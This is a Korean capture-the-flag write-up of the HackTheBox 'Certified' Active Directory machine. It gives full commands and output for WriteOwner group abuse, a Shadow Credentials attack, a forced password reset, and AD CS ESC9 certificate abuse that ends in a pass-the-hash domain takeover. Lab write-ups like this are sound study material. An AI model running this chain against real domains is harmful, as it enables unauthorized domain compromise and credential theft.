# HTB-CERTIFIED
```bash
OS: Windows(AD)
DATE: 26.10.23
DIFFICULTY: Medium
```

## RECON
먼저 머신을 풀기 전, 이번 머신은 초기 자격증명을 주고 시작하였다. **Username: judith.mader Password: judith09**
**nmap**: 초기 포트를 파악하기 위해 전체 포트 검사와 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4  IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49693,49694,49695,49722,49727 IP | tee nmap
```
확인 결과 88, 389 등의 포트가 열려 있는 것으로 보아 AD DC 서버로 판단되었다. 따라서 초기 자격증명으로 BloodHound와 SMB 열거를 진행하였다.
```bash
bloodhound-python -u judith.mader -p 'judith09' -d certified.htb -ns IP -c all
```
```bash
nxc smb IP -u judith.mader -p judith09 --shares
```
확인 결과 별다른 공유 폴더는 발견하지 못했다.

## Initial Access
BloodHound의 outbound 관계를 확인해 보았다.

![blod](attach_real/Pasted%20image%2020261026193514.png)

확인 결과 judith.mader 유저와 **Management**라는 그룹이 `WriteOwner`로 엮여 있었다. 따라서 Linux에서 abusing을 진행하였다. 단계는 다음과 같다. 소유권 탈취 → 자기 권한 부여 → 멤버 가입 순으로 진행하였다.
```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'Management' -dc-ip <IP> 'certified.htb/judith.mader:judith09'
```
```bash
impacket-dacledit -action write -rights WriteMembers -principal 'judith.mader' -target 'Management' -dc-ip <IP> 'certified.htb/judith.mader:judith09'
```
```bash
net rpc group addmem "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S "dc01.certified.htb"
```
이렇게 Management 그룹에 judith.mader를 가입시켰다. 가입 후 정상적으로 등록되었는지 확인하였다.
```bash
net rpc group members "Management" -U "certified.htb/judith.mader%judith09" -S "dc01.certified.htb"
```
그 결과 정상적으로 등록된 것을 확인하였다. 이후 Management 그룹과 outbound로 연결된 관계가 있는지 다시 한번 확인해 보았다.

![blod2](attach_real/Pasted%20image%2020261026194132.png)

확인 결과 `management_svc`라는 유저와 **GenericWrite** 관계라는 것을 알게 되었다. 따라서 Linux에서의 abuse 방법을 확인하였다. 여러 가지 공격 루트가 있었지만 먼저 `Targeted Kerberoast`를 시도하였으나 크랙이 불가능하였다. 따라서 pywhisker라는 도구를 사용하는 `Shadow Credentials attack`을 시도하였지만, 무슨 이유에서인지 pywhisker 도구가 제대로 작동하지 않았다. 마지막 방법으로 AD CS ESC14 취약점을 공략해 보았다. certipy-ad find 기능으로 취약 여부를 확인했지만 취약하지 않았다. 따라서 pywhisker 도구 대신 다른 도구가 있는지 찾아보았다. 찾아본 결과 `certipy-ad shadow auto` 도구로 대상을 공격할 수 있다고 하여 시도하였다.
```bash
certipy-ad shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'management_svc' -dc-ip IP
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'eac8920b1545454fb2f5b38b1d1a2fab'
[*] Adding Key Credential with device ID 'eac8920b1545454fb2f5b38b1d1a2fab' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'eac8920b1545454fb2f5b38b1d1a2fab' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```
이로써 management_svc 계정의 NT hash를 얻게 되어 PTH(Pass-the-Hash)가 가능해졌다. 이후 쉘에 접속하여 user flag를 획득하였다.

![user](attach_real/Pasted%20image%2020261026185506.png)

## Privilege Escalation
유저 쉘을 얻은 뒤 한번 더 BloodHound를 확인한 결과, CA_OPERATOR 유저와 **GenericAll** 관계였다.

![blod3](attach_real/Pasted%20image%2020261026225733.png)

처음에 `Targeted Kerberoast` 공격을 시도하였지만 실패하여, Linux abusing의 Force Change Password를 시도해 보았다.
```bash
net rpc password "ca_operator" "pass@123" -U "certified.htb"/"MANAGEMENT_SVC" -S IP -N --pw-nt-hash a091c1832bcdd4677c28b5a6a1295584
```
하지만 어떤 이유인지는 모르겠으나 net 도구에서는 PTH가 되지 않는 것 같았다. 따라서 `impacket-changepasswd` 도구를 사용하여 다시 한번 시도해 보았다.
```bash
impacket-changepasswd certified.htb/ca_operator@dc01.certified.htb -newpass 'NewPass@123' -altuser certified.htb/management_svc -althash a091c1832bcdd4677c28b5a6a1295584 -reset
```
그 결과 ca_operator 유저의 비밀번호를 새로 설정할 수 있었다. 이후 계정 이름이 CA_OPERATOR인 점에 착안하여 CA를 확인해 주었다.
```bash
certipy-ad find -username ca_operator@certified.htb -p 'NewPass@123' -dc-ip IP -vulnerable -stdout 

CA Name                             : certified-DC01-CA                                                                                                                                                        
    DNS Name                            : DC01.certified.htb                                                                                                                                                       
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb                                                                                                                               
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D                                                                                                                                         
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00                                                                                                                                                
    Certificate Validity End            : 2124-05-13 15:43:41+00:00 
Template Name                       : CertifiedAuthentication                                        
    Display Name                        : Certified Authentication                                       
    Certificate Authorities             : certified-DC01-CA

  [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca                                      
    [!] Vulnerabilities                             
      ESC9                              : Template has no security extension.                            
    [*] Remarks                                     
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```
확인 결과 ESC9 취약점이 존재하는 것을 알게 되었다. 따라서 [exploit tutorial](https://medium.com/@iam_elango/adcs-esc-attacks-f940aad15b45)을 확인한 후 exploit을 진행해 보았다. 계획은 다음과 같았다. 먼저 내가 제어하는 계정의 UPN을 administrator로 변경한 뒤, ca_operator로 인증서를 요청하고(SID 없음), 이후 그 인증서로 인증하면 DC가 "UPN이 administrator네" 하고 administrator로 인증해 주는 방식이었다. 따라서 management_svc 계정으로 인증하여 ca_operator의 UPN을 administrator로 변경해 주었다.
```bash
certipy-ad account update -u 'management_svc@certified.htb' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn administrator -dc-ip <IP>
```
변경 후 ca_operator로 인증서를 요청하였다.
```bash
certipy-ad req -u 'ca_operator@certified.htb' -p 'NewPass@123' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication' -dc-ip <IP>
```
UPN이 administrator이므로 administrator용 인증서를 발급받았다. 이제 ca_operator의 UPN을 원래대로 복구해 주었다.
```bash
certipy-ad account update -u 'management_svc@certified.htb' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn 'ca_operator@certified.htb' -dc-ip <IP>
```
이제 administrator로 인증하였다.
```bash
certipy-ad auth -pfx administrator.pfx -username administrator -domain certified.htb -dc-ip <IP>
```
그 결과 administrator의 NT hash를 얻게 되어, PTH로 쉘에 접속하여 root.txt를 획득하였다.

![admin](attach_real/Pasted%20image%2020261026185443.png)

## New Inform
- WriteOwner 체인: 1. 소유권 탈취 2. 자기 권한 부여 3. 멤버 가입
- 멤버 가입 체인일 때는 항상 그룹에 정상적으로 들어갔는지 체크하자
- BloodHound에는 여러 공격 루트가 있다. 한 공격 루트가 막혔다고 포기하지 말고 여러 방면으로 시도하자
- BloodHound에서 ESC는 "취약할 수도 있다"고 알려 줄 뿐, 확정은 아니다
- 도구에 문제가 있다면 다른 도구를 찾아보자
- Shadow Credentials attack에서는 pywhisker 대신 `certipy-ad shadow auto` 명령어를 사용하자
- net 도구는 PTH 문제가 있을 수 있음
- 문제가 생기면 다른 도구를 찾아보자
- ESC9 = "인증서에 보안 확장(SID)이 없어서, UPN만으로 신원이 판별되는 것"
- 항상 exploit 명령어를 꼼꼼히 확인하자
- 전에 사용하던 계정을 다시 사용할 수도 있음